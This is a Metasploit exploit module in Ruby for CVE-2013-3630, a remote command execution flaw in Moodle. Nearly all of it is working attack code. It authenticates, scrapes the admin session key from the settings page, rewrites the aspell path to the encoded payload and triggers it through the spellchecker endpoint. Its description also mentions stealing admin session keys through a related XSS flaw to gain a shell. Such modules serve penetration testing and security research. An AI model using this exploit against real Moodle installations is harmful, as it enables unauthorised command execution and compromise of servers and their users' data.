# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;rexml/document&#039;

class Metasploit4 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
    &#039;Name&#039;           => &#039;Moodle Remote Command Execution&#039;,
    &#039;Description&#039;    => %q{
    Moodle allows an authenticated user to define spellcheck settings via the web interface.
    The user can update the spellcheck mechanism to point to a system-installed aspell binary.
    By updating the path for the spellchecker to an arbitrary command, an attacker can run
    arbitrary commands in the context of the web application upon spellchecking requests.

    This module also allows an attacker to leverage another privilege escalation vuln.
    Using the referenced XSS vuln, an unprivileged authenticated user can steal an admin sesskey
    and use this to escalate privileges to that of an admin, allowing the module to pop a shell

    This module was tested against Moodle version 2.5.2 and 2.2.3.
    },
    &#039;License&#039;        => MSF_LICENSE,
    &#039;Author&#039;         =>
      [
        &#039;Brandon Perry <bperry.volatile[at]gmail.com>&#039; # Discovery / msf module
      ],
    &#039;References&#039;     =>
      [
        [&#039;CVE&#039;, &#039;2013-3630&#039;],
        [&#039;EDB&#039;, &#039;28174&#039;], #xss vuln allowing sesskey of admins to be stolen
        [&#039;URL&#039;, &#039;https://community.rapid7.com/community/metasploit/blog/2013/10/30/seven-tricks-and-treats&#039;]
      ],
    &#039;Payload&#039;        =>
    {
      &#039;Compat&#039;     =>
      {
        &#039;PayloadType&#039;  => &#039;cmd&#039;,
        &#039;RequiredCmd&#039;  => &#039;generic perl ruby bash telnet python&#039;,
      }
    },
    &#039;Platform&#039;       => [&#039;unix&#039;, &#039;linux&#039;],
    &#039;Arch&#039;           => ARCH_CMD,
    &#039;Targets&#039;        => [[&#039;Automatic&#039;,{}]],
    &#039;DisclosureDate&#039; => &#039;Oct 30 2013&#039;,
    &#039;DefaultTarget&#039;  => 0
    ))

    register_options(
    [
      OptString.new(&#039;USERNAME&#039;, [ true, "Username to authenticate with", &#039;admin&#039;]),
      OptString.new(&#039;PASSWORD&#039;, [ true, "Password to authenticate with", &#039;&#039;]),
      OptString.new(&#039;SESSKEY&#039;, [ false, "The session key of the user to impersonate", ""]),
      OptString.new(&#039;TARGETURI&#039;, [ true, "The URI of the Moodle installation", &#039;/moodle/&#039;])
    ], self.class)
  end

  def exploit
    init = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/index.php&#039;)
    })

    sess = init.get_cookies

    post = {
      &#039;username&#039; => datastore["USERNAME"],
      &#039;password&#039; => datastore["PASSWORD"]
    }

    print_status("Authenticating as user: " << datastore["USERNAME"])

    login = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/login/index.php&#039;),
      &#039;vars_post&#039; => post,
      &#039;cookie&#039; => sess
    })

    if !login or login.code != 303
      fail_with("Login failed")
    end

    sess = login.get_cookies

    print_status("Getting session key to update spellchecker if no session key was specified")

    sesskey = &#039;&#039;
    if datastore[&#039;SESSKEY&#039;] == &#039;&#039;
      tinymce = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/admin/settings.php&#039;) + &#039;?section=editorsettingstinymce&#039;,
        &#039;cookie&#039; => sess
      })

      tinymce.body.each_line do |line|
        next if line !~ /name="sesskey"/
        sesskey = line[0..line.index(&#039;>&#039;)]
      end

      if sesskey == &#039;&#039;
        fail_with("Unable to get proper session key")
      end

      sesskey = REXML::Document.new sesskey
      sesskey = sesskey.root.attributes["value"]
    else
      sesskey = datastore[&#039;SESSKEY&#039;]
    end

    post = {
      &#039;section&#039; => &#039;editorsettingstinymce&#039;,
      &#039;sesskey&#039; => sesskey,
      &#039;return&#039; => &#039;&#039;,
      &#039;s_editor_tinymce_spellengine&#039; => &#039;PSpellShell&#039;,
      &#039;s_editor_tinymce_spelllanguagelist&#039; => &#039;%2BEnglish%3Den%2CDanish%3Dda%2CDutch%3Dnl%2CFinnish%3Dfi%2CFrench%3Dfr%2CGerman%3Dde%2CItalian%3Dit%2CPolish%3Dpl%2CPortuguese%3Dpt%2CSpanish%3Des%2CSwedish%3Dsv&#039;
    }

    print_status("Updating spellchecker to use the system aspell")

    post = {
      &#039;section&#039; => &#039;systempaths&#039;,
      &#039;sesskey&#039; => sesskey,
      &#039;return&#039; => &#039;&#039;,
      &#039;s__gdversion&#039; => &#039;2&#039;,
      &#039;s__pathtodu&#039; => &#039;/usr/bin/du&#039;,
      &#039;s__aspellpath&#039; => payload.encoded,
      &#039;s__pathtodot&#039; => &#039;&#039;
    }

    aspell = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/admin/settings.php&#039;),
      &#039;vars_post&#039; => post,
      &#039;cookie&#039; => sess
    })

    spellcheck = &#039;{"id":"c0","method":"checkWords","params":["en",[""]]}&#039;

    print_status("Triggering payload")

    resp = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/lib/editor/tinymce/tiny_mce/3.4.9/plugins/spellchecker/rpc.php&#039;),
      &#039;data&#039; => spellcheck,
      &#039;ctype&#039; => &#039;application/json&#039;,
      &#039;cookie&#039; => sess
    })

    if !resp or resp.code != 200
      fail_with("Error triggering payload")
    end

  end
end

